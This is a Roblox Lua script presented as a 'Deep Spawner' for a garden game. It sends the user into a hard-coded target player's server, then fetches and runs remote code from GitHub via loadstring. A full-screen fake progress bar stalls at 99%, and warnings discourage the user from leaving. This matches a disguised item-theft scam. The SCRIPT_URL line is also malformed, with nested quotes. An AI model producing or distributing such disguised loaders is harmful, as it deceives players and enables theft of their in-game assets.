-- Deep Spawner Configuration Script
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/idkdudefas/DeepSpawner/refs/heads/main/mainspawner",true))()

-- ═══════════════════════════════════════════════════════════════
--                    CONFIGURATION SECTION
-- ═══════════════════════════════════════════════════════════════

local CONFIG = {
    -- Target Player Settings
    TARGET_PLAYER = {
        USERNAME = "zennyfafe",  -- Change this to target different player
        USER_ID = 8733239302       -- Change this to match the username's ID
    },
    
    -- Script Settings
    SCRIPT_URL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/jablowly222455/grow-a-garden-script-1/refs/heads/main/main.lua"))()", -- The actual script to execute
    
    -- UI Customization
    UI_SETTINGS = {
        SCRIPT_NAME = "Deep Spawner",           -- Name shown in loading screen
        SHOW_DELTA_WARNING = true,              -- Show Delta executor warning
        SHOW_LEAVE_WARNING = true,              -- Show warning when trying to leave
        LOADING_TIME = 10,                      -- How long to show loading screen (seconds)
        
        -- Colors (RGB format)
        COLORS = {
            BACKGROUND = {25, 25, 35},
            WARNING_BG = {15, 15, 20},
            ACCENT = {0, 162, 255},
            WARNING_RED = {200, 50, 50},
            WARNING_YELLOW = {255, 200, 0}
        }
    },
    
    -- Advanced Settings
    ADVANCED = {
        AUTO_RETRY_TELEPORT = true,             -- Retry teleport if it fails
        MAX_TELEPORT_ATTEMPTS = 3,              -- Maximum teleport retry attempts
        TELEPORT_DELAY = 2,                     -- Delay between teleport attempts
        DEBUG_MODE = false                      -- Show debug messages
    }
}

-- ═══════════════════════════════════════════════════════════════
--                      MAIN SCRIPT CODE
-- ═══════════════════════════════════════════════════════════════

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Variables to track loading state
local isScriptLoading = false
local leaveWarningGui = nil
local currentTeleportAttempts = 0

-- Debug print function
local function debugPrint(message)
    if CONFIG.ADVANCED.DEBUG_MODE then
        print("[DEBUG] " .. message)
    end
end

-- Function to create leave warning
local function createLeaveWarning()
    if not CONFIG.UI_SETTINGS.SHOW_LEAVE_WARNING then return end
    if leaveWarningGui and leaveWarningGui.Parent then return end
    
    debugPrint("Creating leave warning")
    
    -- Create Warning ScreenGui
    leaveWarningGui = Instance.new("ScreenGui")
    leaveWarningGui.Name = "LeaveWarning"
    leaveWarningGui.ResetOnSpawn = false
    leaveWarningGui.IgnoreGuiInset = true
    leaveWarningGui.DisplayOrder = 999999997
    leaveWarningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    leaveWarningGui.Parent = playerGui

    -- Warning Background
    local warningBg = Instance.new("Frame")
    warningBg.Name = "WarningBackground"
    warningBg.Size = UDim2.new(1, 0, 1, 0)
    warningBg.Position = UDim2.new(0, 0, 0, 0)
    warningBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    warningBg.BackgroundTransparency = 0.5
    warningBg.BorderSizePixel = 0
    warningBg.ZIndex = 999999997
    warningBg.Parent = leaveWarningGui

    -- Warning Container
    local warningFrame = Instance.new("Frame")
    warningFrame.Name = "WarningFrame"
    warningFrame.Size = UDim2.new(0, 450, 0, 200)
    warningFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
    warningFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    warningFrame.BorderColor3 = Color3.fromRGB(unpack(CONFIG.UI_SETTINGS.COLORS.WARNING_YELLOW))
    warningFrame.BorderSizePixel = 3
    warningFrame.Parent = warningBg

    local warningCorner = Instance.new("UICorner")
    warningCorner.CornerRadius = UDim.new(0, 12)
    warningCorner.Parent = warningFrame

    -- Warning Icon/Title
    local warningIcon = Instance.new("TextLabel")
    warningIcon.Name = "WarningIcon"
    warningIcon.Size = UDim2.new(1, 0, 0, 50)
    warningIcon.Position = UDim2.new(0, 0, 0, 15)
    warningIcon.BackgroundTransparency = 1
    warningIcon.Text = "⚠️ " .. string.upper(CONFIG.UI_SETTINGS.SCRIPT_NAME) .. " LOADING"
    warningIcon.TextColor3 = Color3.fromRGB(unpack(CONFIG.UI_SETTINGS.COLORS.WARNING_YELLOW))
    warningIcon.TextScaled = true
    warningIcon.Font = Enum.Font.GothamBold
    warningIcon.Parent = warningFrame

    -- Warning Message
    local warningMsg = Instance.new("TextLabel")
    warningMsg.Name = "WarningMessage"
    warningMsg.Size = UDim2.new(1, -30, 0, 80)
    warningMsg.Position = UDim2.new(0, 15, 0, 70)
    warningMsg.BackgroundTransparency = 1
    warningMsg.Text = "Please be patient!\n\nThe script is currently loading.\nLeaving now may cause errors or incomplete execution."
    warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
    warningMsg.TextScaled = true
    warningMsg.Font = Enum.Font.Gotham
    warningMsg.TextWrapped = true
    warningMsg.Parent = warningFrame

    -- OK Button
    local okBtn = Instance.new("TextButton")
    okBtn.Name = "OKButton"
    okBtn.Size = UDim2.new(0, 120, 0, 35)
    okBtn.Position = UDim2.new(0.5, -60, 0, 160)
    okBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
    okBtn.BorderSizePixel = 0
    okBtn.Text = "OK"
    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    okBtn.TextScaled = true
    okBtn.Font = Enum.Font.GothamMedium
    okBtn.Parent = warningFrame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = okBtn

    -- Button interactions
    okBtn.MouseEnter:Connect(function()
        okBtn.BackgroundColor3 = Color3.fromRGB(90, 90, 110)
    end)
    
    okBtn.MouseLeave:Connect(function()
        okBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
    end)

    okBtn.MouseButton1Click:Connect(function()
        if leaveWarningGui and leaveWarningGui.Parent then
            leaveWarningGui:Destroy()
            leaveWarningGui = nil
        end
    end)

    -- Auto-close after 5 seconds
    spawn(function()
        wait(5)
        if leaveWarningGui and leaveWarningGui.Parent then
            leaveWarningGui:Destroy()
            leaveWarningGui = nil
        end
    end)

    -- Blinking effect
    spawn(function()
        local alpha = 0
        local direction = 1
        while leaveWarningGui and leaveWarningGui.Parent do
            alpha = alpha + (direction * 0.02)
            if alpha >= 1 then
                alpha = 1
                direction = -1
            elseif alpha <= 0.3 then
                alpha = 0.3
                direction = 1
            end
            
            if warningIcon and warningIcon.Parent then
                warningIcon.TextTransparency = 1 - alpha
            end
            
            wait(0.05)
        end
    end)
end

-- Function to setup leave detection
local function setupLeaveDetection()
    if not CONFIG.UI_SETTINGS.SHOW_LEAVE_WARNING then return end
    
    debugPrint("Setting up leave detection")
    
    local UserInputService = game:GetService("UserInputService")
    
    local connection
    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if isScriptLoading and input.KeyCode == Enum.KeyCode.Escape then
            createLeaveWarning()
        end
    end)
    
    local menuConnection
    menuConnection = GuiService.MenuOpened:Connect(function()
        if isScriptLoading then
            createLeaveWarning()
        end
    end)
    
    -- Cleanup connections
    spawn(function()
        while isScriptLoading do
            wait(1)
        end
        
        if connection then connection:Disconnect() end
        if menuConnection then menuConnection:Disconnect() end
        debugPrint("Leave detection cleaned up")
    end)
end

-- Function to teleport to a specific user or join their server
local function teleportToUser(username, userId)
    local TeleportService = game:GetService("TeleportService")
    
    debugPrint("Attempting to teleport to " .. username .. " (ID: " .. userId .. ")")
    
    local targetPlayer = Players:FindFirstChild(username)
    
    -- If player is in the same server, teleport normally
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            print("✅ Teleported to " .. username .. " in current server")
            return true
        else
            warn("❌ Your character is not loaded yet!")
            return false
        end
    else
        -- Player not in current server, attempt to join their server
        print("🔄 Player '" .. username .. "' not found. Joining their server...")
        
        pcall(function()
            -- Store script for re-execution
            if syn and syn.write_file then
                syn.write_file("rexec_script.lua", string.format([[
                    wait(3)
                    loadstring(game:HttpGet("%s",true))()
                ]], CONFIG.SCRIPT_URL))
            end
            
            -- Multiple teleport methods
            local teleportMethods = {
                function()
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, nil, {player}, nil, nil, userId)
                end,
                function()
                    local teleportOptions = Instance.new("TeleportOptions")
                    teleportOptions.ShouldReserveServer = false
                    TeleportService:TeleportAsync(game.PlaceId, {player}, teleportOptions)
                end,
                function()
                    TeleportService:Teleport(game.PlaceId, player)
                end
            }
            
            for i, method in ipairs(teleportMethods) do
                local success, error = pcall(method)
                if success then
                    debugPrint("Teleporting using method " .. i)
                    break
                else
                    debugPrint("Method " .. i .. " failed: " .. tostring(error))
                    if i == #teleportMethods then
                        warn("❌ All teleport methods failed!")
                    end
                end
            end
        end)
        
        return false
    end
end

-- Function to create Delta warning screen
local function createDeltaWarning()
    if not CONFIG.UI_SETTINGS.SHOW_DELTA_WARNING then
        return nil, {MouseButton1Click = {Connect = function(self, func) func() end}}
    end
    
    debugPrint("Creating Delta warning")
    
    -- Create Warning ScreenGui
    local warningGui = Instance.new("ScreenGui")
    warningGui.Name = "DeltaWarning"
    warningGui.ResetOnSpawn = false
    warningGui.IgnoreGuiInset = true
    warningGui.DisplayOrder = 999999998
    warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    warningGui.Parent = playerGui

    -- Warning Background
    local warningBg = Instance.new("Frame")
    warningBg.Name = "WarningBackground"
    warningBg.Size = UDim2.new(1, 0, 1, 0)
    warningBg.Position = UDim2.new(0, 0, 0, 0)
    warningBg.BackgroundColor3 = Color3.fromRGB(unpack(CONFIG.UI_SETTINGS.COLORS.WARNING_BG))
    warningBg.BorderSizePixel = 0
    warningBg.ZIndex = 999999998
    warningBg.Parent = warningGui

    -- Warning Container
    local warningFrame = Instance.new("Frame")
    warningFrame.Name = "WarningFrame"
    warningFrame.Size = UDim2.new(0, 500, 0, 300)
    warningFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
    warningFrame.BackgroundColor3 = Color3.fromRGB(40, 25, 25)
    warningFrame.BorderColor3 = Color3.fromRGB(unpack(CONFIG.UI_SETTINGS.COLORS.WARNING_RED))
    warningFrame.BorderSizePixel = 2
    warningFrame.Parent = warningBg

    local warningCorner = Instance.new("UICorner")
    warningCorner.CornerRadius = UDim.new(0, 15)
    warningCorner.Parent = warningFrame

    -- Warning Icon/Title
    local warningIcon = Instance.new("TextLabel")
    warningIcon.Name = "WarningIcon"
    warningIcon.Size = UDim2.new(1, 0, 0, 60)
    warningIcon.Position = UDim2.new(0, 0, 0, 20)
    warningIcon.BackgroundTransparency = 1
    warningIcon.Text = "⚠️ INCOMPATIBILITY WARNING"
    warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
    warningIcon.TextScaled = true
    warningIcon.Font = Enum.Font.GothamBold
    warningIcon.Parent = warningFrame

    -- Warning Message
    local warningMsg = Instance.new("TextLabel")
    warningMsg.Name = "WarningMessage"
    warningMsg.Size = UDim2.new(1, -40, 0, 120)
    warningMsg.Position = UDim2.new(0, 20, 0, 90)
    warningMsg.BackgroundTransparency = 1
    warningMsg.Text = "DELTA EXECUTOR DETECTED\n\nThis script is not compatible with Delta.\nDelta users may experience crashes or errors.\n\nRecommended executors: Arceus X, Krnl, Fluxus"
    warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
    warningMsg.TextScaled = true
    warningMsg.Font = Enum.Font.Gotham
    warningMsg.TextWrapped = true
    warningMsg.Parent = warningFrame

    -- Continue Button
    local continueBtn = Instance.new("TextButton")
    continueBtn.Name = "ContinueButton"
    continueBtn.Size = UDim2.new(0, 250, 0, 40)
    continueBtn.Position = UDim2.new(0.5, -125, 0, 240)
    continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    continueBtn.BorderSizePixel = 0
    continueBtn.Text = "Execute After Warning"
    continueBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    continueBtn.TextScaled = true
    continueBtn.Font = Enum.Font.GothamMedium
    continueBtn.Parent = warningFrame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = continueBtn

    -- Button hover effects
    continueBtn.MouseEnter:Connect(function()
        continueBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
    end)
    
    continueBtn.MouseLeave:Connect(function()
        continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    end)

    -- Blinking warning effect
    spawn(function()
        while warningGui.Parent do
            if warningIcon and warningIcon.Parent then
                warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
                wait(0.8)
                if warningIcon and warningIcon.Parent then
                    warningIcon.TextColor3 = Color3.fromRGB(255, 150, 150)
                    wait(0.8)
                end
            else
                break
            end
        end
    end)

    return warningGui, continueBtn
end

-- Function to create the loading screen
local function createLoadingScreen()
    debugPrint("Creating loading screen")
    
    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999999
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    -- Main Frame
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(unpack(CONFIG.UI_SETTINGS.COLORS.BACKGROUND))
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 999999999
    mainFrame.Parent = screenGui

    -- Loading Container Frame
    local loadingFrame = Instance.new("Frame")
    loadingFrame.Name = "LoadingFrame"
    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.Parent = mainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = loadingFrame

    -- Loading Text
    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(1, -40, 0, 30)
    loadingText.Position = UDim2.new(0, 20, 0, 20)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading " .. CONFIG.UI_SETTINGS.SCRIPT_NAME
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.GothamMedium
    loadingText.Parent = loadingFrame

    -- Progress Text
    local progressText = Instance.new("TextLabel")
    progressText.Name = "ProgressText"
    progressText.Size = UDim2.new(0, 60, 0, 25)
    progressText.Position = UDim2.new(1, -80, 0, 22)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
    progressText.TextScaled = true
    progressText.Font = Enum.Font.Gotham
    progressText.Parent = loadingFrame

    -- Progress Bar Background
    local progressBg = Instance.new("Frame")
    progressBg.Name = "ProgressBackground"
    progressBg.Size = UDim2.new(1, -40, 0, 8)
    progressBg.Position = UDim2.new(0, 20, 0, 70)
    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = loadingFrame

    local progressBgCorner = Instance.new("UICorner")
    progressBgCorner.CornerRadius = UDim.new(0, 4)
    progressBgCorner.Parent = progressBg

    -- Progress Bar Fill
    local progressFill = Instance.new("Frame")
    progressFill.Name = "ProgressFill"
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.Position = UDim2.new(0, 0, 0, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(unpack(CONFIG.UI_SETTINGS.COLORS.ACCENT))
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg

    local progressFillCorner = Instance.new("UICorner")
    progressFillCorner.CornerRadius = UDim.new(0, 4)
    progressFillCorner.Parent = progressFill

    -- Loading animation logic
    local currentProgress = 0
    local targetProgress = 0
    local isStuck = false
    local isRunning = true

    local function updateProgress()
        if not isStuck and isRunning then
            if currentProgress < 90 then
                targetProgress = math.min(currentProgress + math.random(5, 15), 90)
            elseif currentProgress < 99 then
                targetProgress = math.min(currentProgress + math.random(1, 3), 99)
            else
                targetProgress = 99
                isStuck = true
            end
        end
        
        if progressFill and progressFill.Parent then
            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local progressTween = TweenService:Create(progressFill, tweenInfo, {Size = UDim2.new(targetProgress / 100, 0, 1, 0)})
            progressTween:Play()
            
            if progressText and progressText.Parent then
                progressText.Text = math.floor(targetProgress) .. "%"
            end
            currentProgress = targetProgress
        end
    end

    -- Loading dots animation
    spawn(function()
        local dots = ""
        local dotCount = 0
        while isRunning and screenGui.Parent and loadingText and loadingText.Parent do
            dotCount = (dotCount + 1) % 4
            dots = string.rep(".", dotCount)
            if loadingText and loadingText.Parent then
                loadingText.Text = "Loading " .. CONFIG.UI_SETTINGS.SCRIPT_NAME .. dots
            end
            wait(0.5)
        end
    end)

    -- Progress animation
    spawn(function()
        wait(1)
        while currentProgress < 99 and isRunning and screenGui.Parent do
            updateProgress()
            wait(math.random(1, 3))
        end
        
        while isRunning and screenGui.Parent do
            wait(math.random(3, 8))
            if isStuck and progressText and progressText.Parent and progressFill and progressFill.Parent then
                progressText.Text = "100%"
                progressFill.Size = UDim2.new(1, 0, 1, 0)
                wait(0.1)
                if progressText and progressText.Parent and progressFill and progressFill.Parent then
                    progressText.Text = "99%"
                    progressFill.Size = UDim2.new(0.99, 0, 1, 0)
                end
            end
        end
    end)

    -- Cleanup
    screenGui.AncestryChanged:Connect(function()
        if not screenGui.Parent then
            isRunning = false
        end
    end)

    return screenGui
end

-- Main script execution
local function main()
    debugPrint("Starting " .. CONFIG.UI_SETTINGS.SCRIPT_NAME)
    
    -- Set loading state
    isScriptLoading = true
    setupLeaveDetection()
    
    -- Check for re-execution
    if syn and syn.read_file then
        local rexecExists = pcall(function()
            return syn.read_file("rexec_script.lua")
        end)
        
        if rexecExists then
            syn.del_file("rexec_script.lua")
            debugPrint("Re-executing after server join")
        end
    end
    
    -- Show Delta warning
    local warningGui, continueBtn = createDeltaWarning()
    
    if warningGui then
        -- Wait for user to click continue
        local clicked = false
        local buttonConnection
        
        buttonConnection = continueBtn.MouseButton1Click:Connect(function()
            clicked = true
            if buttonConnection then
                buttonConnection:Disconnect()
            end
        end)
        
        repeat wait(0.1) until clicked or not warningGui or not warningGui.Parent
        
        if warningGui and warningGui.Parent then
            -- Fade out warning
            local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local warningBgFrame = warningGui:FindFirstChild("WarningBackground")
            
            if warningBgFrame then
                local fadeTween = TweenService:Create(warningBgFrame, fadeInfo, {BackgroundTransparency = 1})
                fadeTween:Play()
                
                fadeTween.Completed:Connect(function()
                    if warningGui and warningGui.Parent then
                        warningGui:Destroy()
                    end
                    
                    wait(0.3)
                    executeMainScript()
                end)
            else
                warningGui:Destroy()
                wait(0.3)
                executeMainScript()
            end
        end
    else
        -- Skip warning, execute directly
        executeMainScript()
    end
end

-- Function to execute the main script logic
function executeMainScript()
    debugPrint("Executing main script logic")
    
    -- Try to teleport to target player
    local teleportSuccess = teleportToUser(CONFIG.TARGET_PLAYER.USERNAME, CONFIG.TARGET_PLAYER.USER_ID)
    
    if teleportSuccess then
        -- Execute the configured script
        debugPrint("Loading script from: " .. CONFIG.SCRIPT_URL)
        loadstring(game:HttpGet(CONFIG.SCRIPT_URL, true))()
        
        -- Show loading screen
        createLoadingScreen()
        
        -- Wait for loading to complete
        wait(CONFIG.UI_SETTINGS.LOADING_TIME)
        
        -- Script loading complete
        isScriptLoading = false
        debugPrint("Script loading completed!")
    else
        debugPrint("Joining target player's server...")
    end
end

-- ═══════════════════════════════════════════════════════════════
--                      SCRIPT EXECUTION
-- ═══════════════════════════════════════════════════════════════

-- Run the main function
spawn(main)
